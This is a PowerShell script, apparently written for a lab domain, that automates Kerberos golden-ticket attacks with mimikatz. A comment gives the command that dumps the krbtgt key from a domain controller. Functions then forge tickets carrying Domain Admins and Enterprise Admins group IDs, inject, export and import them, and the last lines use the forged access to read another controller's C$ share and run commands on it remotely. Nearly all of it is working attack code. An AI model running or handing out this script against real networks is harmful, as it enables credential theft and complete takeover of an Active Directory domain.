#Run one of these commands on the DC to get the keys
# .\mimikatz.exe "lsadump::lsa /inject /name:krbtgt" exit
#

$domainName = 'a'
$domainFqdn = 'a.vm.net'
$userName = 'install'

$domainContext = New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext('Domain', $domainFqdn)
$domain = [System.DirectoryServices.ActiveDirectory.Domain]::GetDomain($domainContext).GetDirectoryEntry()
$domainSid = [byte[]]$domain.Properties["objectSID"].Value
$domainSid = (New-Object System.Security.Principal.SecurityIdentifier($domainSid, 0)).Value

$user = New-Object System.Security.Principal.NTAccount("$domainName\$userName")
$userRid = $user.Translate([System.Security.Principal.SecurityIdentifier]).Value.Split('-')[-1]

$aesKey = '<InsertKrbTgtAesHash>'
$ntlm = '<InsertKrbTgtNltmHash>'

function New-GoldenTicketAesKey
{
    klist purge

    C:\mimikatz\x64\mimikatz.exe "kerberos::golden /domain:$domainFqdn /sid:$domainSid /aes256:$aesKey /user:$userName /id:$userRid /groups:513,512,520,518,519,4554,3243243,3223 /ptt /startoffset:-10 /endin:6000 /renewmax:10080" exit
}

function New-GoldenTicketNtlmHash
{
    klist purge

    C:\mimikatz\x64\mimikatz.exe "kerberos::golden /domain:$domainFqdn /sid:$domainSid /rc4:$ntlm /user:$userName /id:$userRid /groups:513,512,520,518,519,3450 /ptt /startoffset:-10 /endin:6000 /renewmax:10080" exit
}

function Export-GoldenTicketNtlmHash
{
    param (
        [Parameter(Mandatory)]
        [string]$Path
    )
    C:\mimikatz_trunk\x64\mimikatz.exe "kerberos::golden /admin:$userName /domain:$domainFqdn /sid:$domainSid /krbtgt:$ntlm /ticket:$Path" exit
}

function Import-GoldenTicket
{
    param (
        [Parameter(Mandatory)]
        [string]$Path
    )

    klist purge
    C:\mimikatz_trunk\x64\mimikatz.exe "kerberos::ptt $Path" exit
}

return

dir \\kerbdc2\c$
Invoke-Command -ComputerName KerbDC2 -ScriptBlock { whoami.exe /all }
